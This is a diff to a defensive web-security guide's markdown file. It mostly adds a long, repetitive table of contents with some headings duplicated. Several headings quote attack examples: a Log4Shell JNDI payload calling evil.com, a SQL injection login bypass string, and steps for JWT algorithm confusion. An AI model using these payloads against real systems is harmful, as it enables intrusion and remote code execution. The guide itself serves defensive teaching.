@@ -1,5 +1,503 @@
 # SECURITY
 
+## Table of Contents
+
+- [Table of Contents](#table-of-contents)
+- [05_SECURITY.MD: THE TITAN GUIDE (50K TARGET)](#05_securitymd-the-titan-guide-50k-target)
+- [Production-Grade Authentication, Encryption, and OWASP](#production-grade-authentication-encryption-and-owasp)
+- [ADVANCED SECURITY PATTERNS](#advanced-security-patterns)
+- [OWASP Top 10 Prevention](#owasp-top-10-prevention)
+- [1. Injection](#1-injection)
+- [2. Broken Authentication](#2-broken-authentication)
+- [3. XSS Prevention](#3-xss-prevention)
+- [4. CSRF Protection](#4-csrf-protection)
+- [Security Headers](#security-headers)
+- [Essential Headers](#essential-headers)
+- [Helmet.js (Express)](#helmetjs-express)
+- [Password Security](#password-security)
+- [Hashing](#hashing)
+- [Password Requirements](#password-requirements)
+- [API Security](#api-security)
+- [Rate Limiting](#rate-limiting)
+- [Input Validation](#input-validation)
+- [Secrets Management](#secrets-management)
+- [Environment Variables](#environment-variables)
+- [Secret Rotation](#secret-rotation)
+- [Audit Logging](#audit-logging)
+- [What to Log](#what-to-log)
+- [Log Format](#log-format)
+- [AUTHENTICATION DEEP DIVE](#authentication-deep-dive)
+- [JWT Best Practices](#jwt-best-practices)
+- [Token Structure](#token-structure)
+- [Security Rules](#security-rules)
+- [Refresh Token Flow](#refresh-token-flow)
+- [OAuth 2.0 / OIDC](#oauth-20-oidc-2)
+- [Common Providers](#common-providers)
+- [Flows](#flows)
+- [Session Security](#session-security)
+- [Cookie Settings](#cookie-settings)
+- [INPUT VALIDATION 2](#input-validation-2)
+- [Validation Libraries](#validation-libraries)
+- [Zod Example](#zod-example)
+- [Sanitization](#sanitization)
+- [Common Issues](#common-issues)
+- [Solutions](#solutions)
+- [CORS EXPLAINED](#cors-explained)
+- [How CORS Works](#how-cors-works)
+- [Simple vs Preflight](#simple-vs-preflight)
+- [Simple Request (no preflight)](#simple-request-no-preflight)
+- [Preflight Request](#preflight-request)
+- [Configuration](#configuration)
+- [Express](#express)
+- [Headers Explained](#headers-explained)
+- [Common Issues 2](#common-issues-2)
+- [ENCRYPTION PATTERNS](#encryption-patterns)
+- [Encryption Types](#encryption-types)
+- [Hashing vs Encryption](#hashing-vs-encryption)
+- [Password Hashing](#password-hashing)
+- [Never Do](#never-do)
+- [Data Encryption](#data-encryption)
+- [API SECURITY CHECKLIST](#api-security-checklist)
+- [Authentication](#authentication)
+- [Authorization](#authorization)
+- [Input Validation 3](#input-validation-3)
+- [Rate Limiting 2](#rate-limiting-2)
+- [Headers](#headers)
+- [Logging](#logging)
+- [ZERO TRUST SECURITY](#zero-trust-security)
+- [Core Principles](#core-principles)
+- [Implementation](#implementation)
+- [Everywhere Authentication](#everywhere-authentication)
+- [Micro-segmentation](#micro-segmentation)
+- [Continuous Verification](#continuous-verification)
+- [Context Factors](#context-factors)
+- [Technologies](#technologies)
+- [CONTENT SECURITY POLICY](#content-security-policy)
+- [CSP Header](#csp-header)
+- [Directives Explained](#directives-explained)
+- [Nonce Pattern](#nonce-pattern)
+- [API KEY PATTERNS](#api-key-patterns)
+- [Key Generation](#key-generation)
+- [Secure Storage](#secure-storage)
+- [Validation](#validation)
+- [OAUTH 2.0 FLOWS](#oauth-20-flows)
+- [Authorization Code Flow (Best for web apps)](#authorization-code-flow-best-for-web-apps)
+- [PKCE Flow (Best for SPAs/Mobile)](#pkce-flow-best-for-spasmobile)
+- [Token Storage](#token-storage)
+- [SUBDOMAIN TAKEOVER PREVENTION](#subdomain-takeover-prevention)
+- [How Takeover Happens](#how-takeover-happens)
+- [Detection](#detection)
+- [Prevention Checklist](#prevention-checklist)
+- [RATE LIMIT BYPASS PREVENTION](#rate-limit-bypass-prevention)
+- [Common Bypass Attempts](#common-bypass-attempts)
+- [Multi-Layer Limits](#multi-layer-limits)
+- [Response Pattern](#response-pattern)
+- [SECURE FILE UPLOAD](#secure-file-upload)
+- [Validation Checklist](#validation-checklist)
+- [Content-Type Validation](#content-type-validation)
+- [Secure Filename](#secure-filename)
+- [Storage Path](#storage-path)
+- [DEPENDENCY SCANNING](#dependency-scanning)
+- [npm audit](#npm-audit)
+- [Check vulnerabilities](#check-vulnerabilities)
+- [Auto-fix what's possible](#auto-fix-whats-possible)
+- [Force major updates (careful!)](#force-major-updates-careful)
+- [GitHub Action](#github-action)
+- [Dependabot config](#dependabot-config)
+- [Supply Chain Security](#supply-chain-security)
+- [CSRF PREVENTION PATTERNS](#csrf-prevention-patterns)
+- [Token Pattern](#token-pattern)
+- [SameSite Cookies](#samesite-cookies)
+- [Double Submit Pattern](#double-submit-pattern)
+- [XSS PREVENTION PATTERNS](#xss-prevention-patterns)
+- [Output Encoding](#output-encoding)
+- [React Protection](#react-protection)
+- [Context-Specific Encoding](#context-specific-encoding)
+- [CSP as Defense in Depth](#csp-as-defense-in-depth)
+- [SECURE HEADERS CONFIGURATION](#secure-headers-configuration)
+- [Essential Headers 2](#essential-headers-2)
+- [Header Reference](#header-reference)
+- [Verification](#verification)
+- [07_SECURITY.MD: THE TITAN GUIDE (25K TARGET)](#07_securitymd-the-titan-guide-25k-target)
+- [Production-Grade Zero Trust, Cryptography, and Pentesting](#production-grade-zero-trust-cryptography-and-pentesting)
+- [**VOLUME 1: THE SCARS (The "Why")**](#volume-1-the-scars-the-why)
+- [**VOLUME 2: THE FOUNDATION (The "What")**](#volume-2-the-foundation-the-what)
+- [**VOLUME 3: THE DEEP DIVE (The "How")**](#volume-3-the-deep-dive-the-how)
+- [**VOLUME 4: THE EXPERT (The "Scale")**](#volume-4-the-expert-the-scale)
+- [**VOLUME 5: THE TITAN (The "Kernel")**](#volume-5-the-titan-the-kernel)
+- [**VOLUME 6: THE INFINITE (The "Future")**](#volume-6-the-infinite-the-future)
+- [VOLUME 1: THE SCARS (THE "WHY") 2](#volume-1-the-scars-the-why-2)
+- [1. THE "LOG4SHELL" (CVE-2021-44228)](#1-the-log4shell-cve-2021-44228)
+  - [The Internet on Fire](#the-internet-on-fire)
+- [4. THE "CAPITAL ONE BREACH"](#4-the-capital-one-breach)
+  - [SSRF (Server Side Request Forgery)](#ssrf-server-side-request-forgery)
+- [VOLUME 2: THE FOUNDATION (THE "WHAT") 2](#volume-2-the-foundation-the-what-2)
+- [5. ZERO TRUST ARCHITECTURE](#5-zero-trust-architecture)
+  - [Never Trust, Always Verify](#never-trust-always-verify)
+- [6. OAUTH2 & OIDC](#6-oauth2-oidc)
+  - [Authentication Flows Deep Dive](#authentication-flows-deep-dive)
+- [VOLUME 3: THE DEEP DIVE (THE "HOW") 2](#volume-3-the-deep-dive-the-how-2)
+- [9. JWT SECURITY](#9-jwt-security)
+  - [Signing & Revocation](#signing-revocation)
+- [10. WAF (WEB APPLICATION FIREWALL)](#10-waf-web-application-firewall)
+  - [Rules & Bypass](#rules-bypass)
+- [VOLUME 4: THE EXPERT (THE "SCALE") 2](#volume-4-the-expert-the-scale-2)
+- [13. SECRET MANAGEMENT](#13-secret-management)
+  - [Vault & AWS Secrets Manager](#vault-aws-secrets-manager)
+- [14. CONTAINER SECURITY](#14-container-security)
+  - [Distroless & Runtime Security](#distroless-runtime-security)
+- [VOLUME 5: THE TITAN (THE "KERNEL") 2](#volume-5-the-titan-the-kernel-2)
+- [16. MEMORY SAFETY](#16-memory-safety)
+  - [Rust vs C++](#rust-vs-c)
+- [18. HOMOMORPHIC ENCRYPTION](#18-homomorphic-encryption)
+  - [Compute on Encrypted Data](#compute-on-encrypted-data)
+- [VOLUME 6: THE INFINITE (THE "FUTURE") 2](#volume-6-the-infinite-the-future-2)
+- [19. QUANTUM-SAFE CRYPTOGRAPHY](#19-quantum-safe-cryptography)
+  - [Post-Quantum Algorithms](#post-quantum-algorithms)
+- [VOLUME 7: THE APPENDIX (TITAN REFERENCE)](#volume-7-the-appendix-titan-reference)
+- [A. THE ULTIMATE SECURITY HEADERS](#a-the-ultimate-security-headers)
+- [B. THE PENTEST CHECKLIST](#b-the-pentest-checklist)
+- [KEYWORD REFERENCE INDEX](#keyword-reference-index)
+- [Each line = 100x LLM expansion potential](#each-line-100x-llm-expansion-potential-2)
+- [OWASP TOP 10 (2021)](#owasp-top-10-2021)
+- [AUTHENTICATION 2](#authentication-2)
+- [AUTHORIZATION 2](#authorization-2)
+- [WEB SECURITY](#web-security)
+- [CRYPTOGRAPHY](#cryptography)
+- [APPLICATION SECURITY](#application-security)
+- [INFRASTRUCTURE SECURITY](#infrastructure-security)
+- [THREAT MODELING](#threat-modeling)
+- [SECURITY OPERATIONS](#security-operations)
+- [PENETRATION TESTING](#penetration-testing)
+- [END OF KEYWORD REFERENCE](#end-of-keyword-reference)
+- [ADVANCED CRYPTOGRAPHY DEEP ATLAS](#advanced-cryptography-deep-atlas)
+- [Each keyword = expandable implementation](#each-keyword-expandable-implementation)
+- [Modern Ciphers](#modern-ciphers)
+- [Key Management](#key-management)
+- [Digital Signatures](#digital-signatures)
+- [Post-Quantum](#post-quantum)
+- [WEB SECURITY DEEP ATLAS](#web-security-deep-atlas)
+- [Each keyword = expandable defense](#each-keyword-expandable-defense)
+- [CSP Advanced](#csp-advanced)
+- [Cookie Security](#cookie-security)
+- [CORS](#cors)
+- [Headers 2](#headers-2)
+- [APPLICATION SECURITY DEEP ATLAS](#application-security-deep-atlas)
+- [Each keyword = expandable technique](#each-keyword-expandable-technique)
+- [SAST](#sast)
+- [DAST](#dast)
+- [IAST](#iast)
+- [SCA](#sca)
+- [CLOUD SECURITY DEEP ATLAS](#cloud-security-deep-atlas)
+- [Each keyword = expandable configuration](#each-keyword-expandable-configuration-2)
+- [IAM](#iam)
+- [Network](#network)
+- [Data](#data)
+- [Compliance](#compliance)
+- [THREAT DETECTION DEEP ATLAS](#threat-detection-deep-atlas)
+- [Each keyword = expandable capability](#each-keyword-expandable-capability)
+- [SIEM](#siem)
+- [EDR/XDR](#edrxdr)
+- [Threat Intelligence](#threat-intelligence)
+  - [END OF MEGA SECURITY EXPANSION](#end-of-mega-security-expansion)
+- [ACCESS DEEP ATLAS](#access-deep-atlas)
+- [Each keyword = expandable implementation 2](#each-keyword-expandable-implementation-2)
+- [Authentication 3](#authentication-3)
+- [OAuth 2.0 / OIDC 2](#oauth-20-oidc-2)
+- [Identity Providers](#identity-providers)
+- [Session Management](#session-management)
+- [NETWORK SECURITY DEEP ATLAS](#network-security-deep-atlas)
+- [Each keyword = expandable control](#each-keyword-expandable-control)
+- [Perimeter Security](#perimeter-security)
+- [Zero Trust](#zero-trust)
+- [Encryption in Transit](#encryption-in-transit)
+- [VPN & Remote Access](#vpn-remote-access)
+- [INCIDENT RESPONSE DEEP ATLAS](#incident-response-deep-atlas)
+- [Each keyword = expandable process](#each-keyword-expandable-process-2)
+- [Preparation](#preparation)
+- [Detection & Analysis](#detection-analysis)
+- [Containment](#containment)
+- [Recovery & Lessons](#recovery-lessons)
+- [COMPLIANCE DEEP ATLAS](#compliance-deep-atlas)
+- [Each keyword = expandable framework](#each-keyword-expandable-framework)
+- [SOC 2](#soc-2)
+- [ISO 27001](#iso-27001)
+- [GDPR](#gdpr)
+- [Industry-Specific](#industry-specific)
+- [SECURE SDLC DEEP ATLAS](#secure-sdlc-deep-atlas)
+- [Each keyword = expandable practice](#each-keyword-expandable-practice-2)
+- [Shift Left](#shift-left)
+- [Build Security](#build-security)
+- [Deploy Security](#deploy-security)
+- [Runtime Security](#runtime-security)
+  - [END OF ULTRA SECURITY EXPANSION](#end-of-ultra-security-expansion)
+  - [Continuing expansion in next iteration](#continuing-expansion-in-next-iteration)
+- [SECURITY CODE EXAMPLES](#security-code-examples)
+- [INPUT VALIDATION 4](#input-validation-4)
+- [Sanitization Middleware](#sanitization-middleware)
+- [CSRF PROTECTION](#csrf-protection)
+- [Token-based CSRF](#token-based-csrf)
+- [ENCRYPTION](#encryption)
+- [Data Encryption at Rest](#data-encryption-at-rest)
+- [API KEY MANAGEMENT](#api-key-management)
+- [Secure API Key Generation](#secure-api-key-generation)
+- [SECURITY HEADERS 2](#security-headers-2)
+- [Helmet Configuration](#helmet-configuration)
+  - [CONTINUED: MORE SECURITY PATTERNS](#continued-more-security-patterns)
+- [DEFENSE](#defense)
+- [JWT VULNERABILITIES DEEP DIVE](#jwt-vulnerabilities-deep-dive)
+- [Production JWT Attack Patterns](#production-jwt-attack-patterns)
+- [SQL INJECTION BEYOND BASICS](#sql-injection-beyond-basics)
+- [Second-Order & Blind SQL Injection](#second-order-blind-sql-injection-2)
+- [RATE LIMITING BYPASS TECHNIQUES](#rate-limiting-bypass-techniques)
+- [Production Rate Limit Evasion](#production-rate-limit-evasion)
+  - [[SECURITY RESEARCHER LEVEL] CONTINUED: MORE PATTERNS](#security-researcher-level-continued-more-patterns)
+  - [Density: OWASP/Bug Bounty research quality](#density-owaspbug-bounty-research-quality)
+- [SECURITY - PENETRATION TESTING](#security---penetration-testing)
+- [Pen Test Phases](#pen-test-phases)
+- [Common Findings](#common-findings)
+- [Bug Bounty Scope](#bug-bounty-scope)
+- [INCIDENT RESPONSE PLAYBOOK](#incident-response-playbook)
+- [Incident Classification](#incident-classification)
+- [Response Steps](#response-steps)
+- [Evidence Preservation](#evidence-preservation)
+- [SECRETS ROTATION](#secrets-rotation)
+- [Rotation Strategy](#rotation-strategy)
+- [AWS Secrets Manager](#aws-secrets-manager)
+- [Database Password Rotation](#database-password-rotation)
+- [AUTHENTICATION PATTERNS](#authentication-patterns)
+- [Stateless JWT Flow](#stateless-jwt-flow)
+- [Refresh Token Pattern](#refresh-token-pattern)
+- [Token Revocation](#token-revocation)
+- [SECURITY LOGGING](#security-logging)
+- [What to Log 2](#what-to-log-2)
+- [Log Format 2](#log-format-2)
+- [Alerting Thresholds](#alerting-thresholds)
+- [INPUT VALIDATION PATTERNS](#input-validation-patterns)
+- [Zod Schema Validation](#zod-schema-validation)
+- [Express Middleware](#express-middleware)
+- [Sanitization 2](#sanitization-2)
+- [SECURE SESSION MANAGEMENT](#secure-session-management)
+- [Session ID Generation](#session-id-generation)
+- [Cookie Settings 2](#cookie-settings-2)
+- [Session Fixation Prevention](#session-fixation-prevention)
+- [Idle Timeout](#idle-timeout)
+- [SECURITY HEADERS DEEP DIVE](#security-headers-deep-dive)
+- [Strict-Transport-Security](#strict-transport-security)
+- [Content-Security-Policy 2](#content-security-policy-2)
+- [X-Frame-Options](#x-frame-options)
+- [Permissions-Policy](#permissions-policy)
+- [PASSWORD SECURITY 2](#password-security-2)
+- [Hashing Algorithm Choice](#hashing-algorithm-choice)
+- [Implementation 2](#implementation-2)
+- [Password Policy](#password-policy)
+- [API AUTHENTICATION PATTERNS](#api-authentication-patterns)
+- [API Key vs JWT vs OAuth](#api-key-vs-jwt-vs-oauth)
+- [API Key Best Practices](#api-key-best-practices)
+- [JWT for APIs](#jwt-for-apis)
+- [Scope-Based Authorization](#scope-based-authorization)
+- [RBAC IMPLEMENTATION](#rbac-implementation)
+- [Database Schema](#database-schema)
+- [Permission Check](#permission-check)
+- [Middleware](#middleware)
+- [MFA IMPLEMENTATION](#mfa-implementation)
+- [TOTP (Time-based One-Time Password)](#totp-time-based-one-time-password)
+- [Backup Codes](#backup-codes)
+- [Recovery Flow](#recovery-flow)
+- [SECURITY SCANNING](#security-scanning)
+- [Static Analysis](#static-analysis)
+- [Dependency Scanning 2](#dependency-scanning-2)
+- [npm audit 2](#npm-audit-2)
+- [Snyk](#snyk)
+- [OWASP Dependency Check](#owasp-dependency-check)
+- [GitHub Actions with Trivy](#github-actions-with-trivy)
+- [GitHub Actions](#github-actions)
+- [Block PR if quality gate fails](#block-pr-if-quality-gate-fails)
+- [.env.local (local dev, gitignored)](#envlocal-local-dev-gitignored)
+- [.env (defaults, committed)](#env-defaults-committed)
+- [.env.production (production values)](#envproduction-production-values)
+- [TERRIBLE - SQL Injection](#terrible---sql-injection)
+- [Attacker: email = "admin'--"](#attacker-email-admin--)
+- [Query: SELECT* FROM users WHERE email = 'admin'--'](#query-select-from-users-where-email-admin--)
+- [Password check bypassed](#password-check-bypassed)
+- [EXCELLENT - Parameterized](#excellent---parameterized)
+- [DISASTER - Plain text](#disaster---plain-text)
+- [EXCELLENT - bcrypt](#excellent---bcrypt)
+- [Attack: Send header containing ${jndi:ldap://evil.com/exploit}](#attack-send-header-containing-jndildapevilcomexploit)
+- [Log4j downloads and executes attacker's code](#log4j-downloads-and-executes-attackers-code)
+- [FIX: Update to Log4j 2.17.0+](#fix-update-to-log4j-2170)
+- [TEMP: -Dlog4j2.formatMsgNoLookups=true](#temp--dlog4j2formatmsgnolookupstrue)
+- [FIX: Enable GitHub Secret Scanning](#fix-enable-github-secret-scanning)
+- [Settings Security Secret scanning Enable](#settings-security-secret-scanning-enable)
+- [Pre-commit hook](#pre-commit-hook)
+- [TERRIBLE - Fetches any URL](#terrible---fetches-any-url)
+- [EXCELLENT - Block internal IPs](#excellent---block-internal-ips)
+- [TITAN: Strict Algorithm Enforcement](#titan-strict-algorithm-enforcement)
+- [CRITICAL: algorithms parameter is a WHITELIST](#critical-algorithms-parameter-is-a-whitelist)
+- [Additional JWT Pitfalls](#additional-jwt-pitfalls)
+- [OPENID CONNECT VULNERABILITIES](#openid-connect-vulnerabilities)
+  - [OIDC State Fixation Scar](#oidc-state-fixation-scar)
+- [DEPENDENCY CONFUSION ATTACK](#dependency-confusion-attack)
+  - [Private Package Hijacking Scar](#private-package-hijacking-scar)
+- [TITAN: Python pip.conf for private packages](#titan-python-pipconf-for-private-packages)
+- [pip.conf](#pipconf)
+- [CRITICAL: Prefer private index](#critical-prefer-private-index)
+- [Private packages should use unique naming](#private-packages-should-use-unique-naming)
+- [E.g., mycompany-analytics, mycompany-utils](#eg-mycompany-analytics-mycompany-utils)
+- [CERTIFICATE CHAIN VALIDATION FAILURES](#certificate-chain-validation-failures)
+- [Incomplete Chain Scar](#incomplete-chain-scar)
+- [CONSTANT-TIME STRING COMPARISON](#constant-time-string-comparison)
+- [Timing Attack Exploitation](#timing-attack-exploitation)
+- [END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS](#end-of-volume-15-titan-supply-chain-identity-attacks-2)
+- [VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS](#volume-16-titan-deep-internals---application-security-mechanics)
+- [OAUTH 2.0: PKCE MANDATORY](#oauth-20-pkce-mandatory)
+  - [Authorization Code Interception](#authorization-code-interception)
+- [SSRF BYPASS TECHNIQUES](#ssrf-bypass-techniques)
+- [IP Address Bypass Scar](#ip-address-bypass-scar)
+- [DESERIALIZATION ATTACKS](#deserialization-attacks)
+- [Object Injection Deep Dive](#object-injection-deep-dive)
+- [TITAN: Safe YAML](#titan-safe-yaml)
+- [Always use safe_load](#always-use-safe_load)
+- [For custom objects, be explicit](#for-custom-objects-be-explicit)
+- [Only allow specific types](#only-allow-specific-types)
+- [RACE CONDITION VULNERABILITIES](#race-condition-vulnerabilities)
+- [Time-of-Check to Time-of-Use (TOCTOU)](#time-of-check-to-time-of-use-toctou)
+- [END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS](#end-of-volume-16-titan-deep-internals---application-security-mechanics)
+- [VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS](#volume-17-titan-gemini-research---advanced-attack-patterns)
+- [JWT NONE ALGORITHM ATTACK](#jwt-none-algorithm-attack)
+  - [The Scar](#the-scar)
+- [TITAN: Explicit algorithm whitelist](#titan-explicit-algorithm-whitelist)
+- [TITAN: Prevent algorithm confusion (RS256 vs HS256)](#titan-prevent-algorithm-confusion-rs256-vs-hs256)
+- [If using RS256 (asymmetric), attacker might](#if-using-rs256-asymmetric-attacker-might)
+- [1. Get public key (often exposed)](#1-get-public-key-often-exposed)
+- [2. Sign token with HS256 using public key as secret](#2-sign-token-with-hs256-using-public-key-as-secret)
+- [3. Server verifies with same "secret" = valid signature](#3-server-verifies-with-same-secret-valid-signature-2-2)
+- [Defense: NEVER use same key handling for both](#defense-never-use-same-key-handling-for-both)
+- [Use correct key based on algorithm](#use-correct-key-based-on-algorithm)
+- [VIBE: Timing-vulnerable comparison](#vibe-timing-vulnerable-comparison)
+- [First character mismatch: ~100ns](#first-character-mismatch-100ns)
+- [Last character mismatch: ~1000ns](#last-character-mismatch-1000ns)
+- [Attacker can detect the difference](#attacker-can-detect-the-difference)
+- [VIBE: Early return on mismatch](#vibe-early-return-on-mismatch)
+- [3](#3)
+- [return crypto.timingSafeEqual(a, b);](#return-cryptotimingsafeequala-b)
+- [} 2 2](#-2-2)
+- [REDOS - REGEX DENIAL OF SERVICE](#redos---regex-denial-of-service)
+- [The Scar 2 2](#the-scar-2-2)
+- [VIBE: Catastrophic backtracking patterns](#vibe-catastrophic-backtracking-patterns)
+- [These regexes have exponential backtracking](#these-regexes-have-exponential-backtracking)
+- [With input: 'a' *30 + '!'](#with-input-a-30-)
+- [Takes MINUTES to return False](#takes-minutes-to-return-false)
+- [UNICODE NORMALIZATION ATTACKS](#unicode-normalization-attacks)
+- [The Scar 3](#the-scar-3)
+- [VIBE: Filter before normalization](#vibe-filter-before-normalization)
+- [Save to database (which normalizes Unicode)](#save-to-database-which-normalizes-unicode)
+- [Attacker passes: (circled letters)](#attacker-passes-circled-letters)
+- [Filter passes. Database normalizes to 'admin'](#filter-passes-database-normalizes-to-admin)
+- [END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS](#end-of-volume-17-titan-gemini-research---advanced-attack-patterns)
+- [VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION](#volume-2-titan-gemini-research---auth-and-secrets-production)
+- [JWT SECURITY PITFALLS](#jwt-security-pitfalls)
+  - [The Scar 3 2](#the-scar-3-2)
+- [VIBE: Hardcoded secrets](#vibe-hardcoded-secrets)
+- [Or slightly better but still dangerous](#or-slightly-better-but-still-dangerous)
+- [API KEY ROTATION](#api-key-rotation)
+- [The Scar 5](#the-scar-5)
+- [VIBE: Static API keys](#vibe-static-api-keys)
+- [END OF VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION](#end-of-volume-2-titan-gemini-research---auth-and-secrets-production)
+- [VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY](#volume-3-titan-gemini-research---supply-chain-security)
+- [DEPENDENCY VULNERABILITY DISASTERS](#dependency-vulnerability-disasters)
+  - [The Scar 5 2](#the-scar-5-2)
+- [TITAN: GitHub Actions with dependency scanning and SBOM](#titan-github-actions-with-dependency-scanning-and-sbom)
+- [Generate SBOM (Software Bill of Materials)](#generate-sbom-software-bill-of-materials)
+- [Scan for vulnerabilities](#scan-for-vulnerabilities)
+- [Check for known malicious packages](#check-for-known-malicious-packages)
+- [Upload SBOM as artifact](#upload-sbom-as-artifact)
+- [Attest SBOM for provenance](#attest-sbom-for-provenance)
+- [Scan container image](#scan-container-image)
+- [Upload scan results](#upload-scan-results)
+- [CONTAINER IMAGE SIGNING](#container-image-signing)
+- [The Scar 6](#the-scar-6)
+- [VIBE: Pull any image, trust registry](#vibe-pull-any-image-trust-registry)
+- [TITAN: Kubernetes admission controller for signature verification](#titan-kubernetes-admission-controller-for-signature-verification)
+- [Kyverno policy](#kyverno-policy)
+- [END OF VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY](#end-of-volume-3-titan-gemini-research---supply-chain-security)
+- [VOLUME 5: ADVANCED SECURITY PATTERNS](#volume-5-advanced-security-patterns)
+- [OWASP TOP 10 PROTECTION](#owasp-top-10-protection)
+  - [SQL Injection Prevention](#sql-injection-prevention)
+  - [XSS Prevention 2 2](#xss-prevention-2-2)
+- [AUTHENTICATION HARDENING](#authentication-hardening)
+  - [Secure Password Handling](#secure-password-handling)
+- [RATE LIMITING & BRUTE FORCE PROTECTION](#rate-limiting-brute-force-protection)
+  - [Account Lockout Pattern](#account-lockout-pattern)
+- [SECRET MANAGEMENT](#secret-management)
+  - [HashiCorp Vault Integration](#hashicorp-vault-integration)
+  - [END OF SECURITY VOLUME 5](#end-of-security-volume-5)
+  - [Lines: ~400+ added](#lines-400-added)
+- [VOLUME 6: REAL 2024 NEXTAUTH.JS PRODUCTION ISSUES](#volume-6-real-2024-nextauthjs-production-issues)
+- [Source: Stack Overflow, GitHub Issues, Developer Reports](#source-stack-overflow-github-issues-developer-reports)
+- [SESSION NOT PERSISTING](#session-not-persisting)
+  - [The Error](#the-error)
+  - [Real Causes and Fixes](#real-causes-and-fixes)
+  - [Cause 1: Missing NEXTAUTH_SECRET in Production](#cause-1-missing-nextauth_secret-in-production)
+  - [Cause 2: Missing NEXTAUTH_URL in Production](#cause-2-missing-nextauth_url-in-production)
+  - [Cause 3: Credentials Provider + Database Adapter Conflict](#cause-3-credentials-provider-database-adapter-conflict)
+  - [Cause 4: useSession Not Updating After Login](#cause-4-usesession-not-updating-after-login)
+- [CALLBACK ERRORS](#callback-errors)
+  - [OAuth Callback URL Mismatch](#oauth-callback-url-mismatch)
+  - [Fix](#fix)
+  - [File Name Case Sensitivity](#file-name-case-sensitivity)
+  - [Fix 2](#fix-2)
+- [CALLBACK CONFIGURATION FOR CUSTOM DATA](#callback-configuration-for-custom-data)
+- [DECISION TREE: NEXTAUTH TROUBLESHOOTING](#decision-tree-nextauth-troubleshooting)
+- [PRODUCTION CHECKLIST](#production-checklist)
+  - [END OF NEXTAUTH.JS REAL PRODUCTION ISSUES](#end-of-nextauthjs-real-production-issues)
+- [VOLUME 7: REAL 2024 JWT SECURITY PATTERNS](#volume-7-real-2024-jwt-security-patterns)
+- [Source: Security Research, CVEs, Production Experience](#source-security-research-cves-production-experience)
+- [JWT VULNERABILITIES](#jwt-vulnerabilities)
+  - [Algorithm Confusion Attack (Most Common)](#algorithm-confusion-attack-most-common)
+  - [Real Fix: Whitelist Algorithms](#real-fix-whitelist-algorithms)
+  - ["none" Algorithm Attack](#none-algorithm-attack)
+  - [Real Fix](#real-fix)
+- [REFRESH TOKEN ROTATION](#refresh-token-rotation)
+  - [The Problem](#the-problem)
+  - [Real Fix: Rotate on Every Use](#real-fix-rotate-on-every-use)
+- [SECURE TOKEN STORAGE](#secure-token-storage)
+- [TOKEN LIFETIME BEST PRACTICES](#token-lifetime-best-practices)
+- [LOGOUT PROPERLY](#logout-properly)
+- [DECISION TREE: JWT DEBUGGING](#decision-tree-jwt-debugging)
+- [JWT SECURITY CHECKLIST](#jwt-security-checklist)
+  - [END OF JWT REAL SECURITY PATTERNS](#end-of-jwt-real-security-patterns)
+- [VOLUME 8: REAL OWASP SECURITY PATTERNS 2024](#volume-8-real-owasp-security-patterns-2024)
+- [Source: OWASP Top 10, Production Experience, Security Research](#source-owasp-top-10-production-experience-security-research)
+- [SQL INJECTION PREVENTION 2](#sql-injection-prevention-2)
+- [XSS PREVENTION 3](#xss-prevention-3)
+- [CSRF PREVENTION](#csrf-prevention)
+- [SECURE HEADERS](#secure-headers)
+- [INPUT VALIDATION 6](#input-validation-6)
+- [DECISION TREE: SECURITY AUDIT](#decision-tree-security-audit)
+  - [END OF OWASP SECURITY PATTERNS](#end-of-owasp-security-patterns)
+- [REAL INPUT VALIDATION PATTERNS 2024](#real-input-validation-patterns-2024)
+- [SQL Injection Prevention 2 2](#sql-injection-prevention-2-2)
+- [XSS Prevention 4](#xss-prevention-4)
+- [CSRF Protection 5](#csrf-protection-5)
+- [Password Hashing 2](#password-hashing-2)
+- [API Key Security](#api-key-security)
+  - [END OF SECURITY PATTERNS](#end-of-security-patterns)
+- [?? ACCOUNT SECURITY PATTERNS 2](#-account-security-patterns-2)
+- [?? OAUTH 2.0 DEEP DIVE 2](#-oauth-20-deep-dive-2)
+- [ENVIRONMENT VARIABLES 2 2](#environment-variables-2-2)
+- [COOKIE SECURITY 2 2](#cookie-security-2-2)
+- [Query: SELECT * FROM users WHERE email = 'admin'--' 2](#query-select-from-users-where-email-admin---2)
+- [Password check bypassed 2 2](#password-check-bypassed-2-2)
+- [Log4j downloads and executes attacker's code 2 2](#log4j-downloads-and-executes-attackers-code-2-2)
+- [VULNERABLE: algorithms not specified 2 2](#vulnerable-algorithms-not-specified-2-2)
+- [3. Server verifies with same "secret" = valid signature 2 2](#3-server-verifies-with-same-secret-valid-signature-2-2)
+- [Attacker can detect the difference 2 2](#attacker-can-detect-the-difference-2-2)
+- [TITAN: Constant-time comparison 2 2](#titan-constant-time-comparison-2-2)
+- [With input: 'a' * 30 + '!' 2](#with-input-a-30-2)
+- [Converts l, a, III, etc 2 2](#converts-l-a-iii-etc-2-2)
+- [Don't use .lower() for security comparisons 2 2](#dont-use-lower-for-security-comparisons-2-2)
+
 ## 05_SECURITY.MD: THE TITAN GUIDE (50K TARGET)
 
 > **?? Disclaimer**: This is educational content synthesized from industry best practices and publicly available documentation. Case studies are illustrative examples for teaching purposes. Last updated: December 2024.
@@ -297,6 +795,7 @@ Log environment variables
 ## Refresh Token Flow
 
 ```text
+
 1. Login -> Access token (15 min) + Refresh token (7 days)
 2. API call with access token
 3. Token expires -> Use refresh token for new access token
@@ -359,7 +858,7 @@ res.cookie('session', sessionId, {
 httpOnly: true,    // No JS access
 secure: true,  // HTTPS only
 sameSite: 'strict', // CSRF protection
-maxAge: 24 * 60 * 60 * 1000, // 24 hours
+maxAge: 24 *60* 60 * 1000, // 24 hours
 path: '/',
 domain: '.example.com'
 });
@@ -457,6 +956,7 @@ const clean = DOMPurify.sanitize(dirty);
 ## How CORS Works
 
 ```text
+
 1. Browser makes cross-origin request
 2. Browser adds Origin header
 3. Server checks origin
@@ -496,7 +996,7 @@ const clean = DOMPurify.sanitize(dirty);
 import cors from 'cors';
 
     app.use(cors({
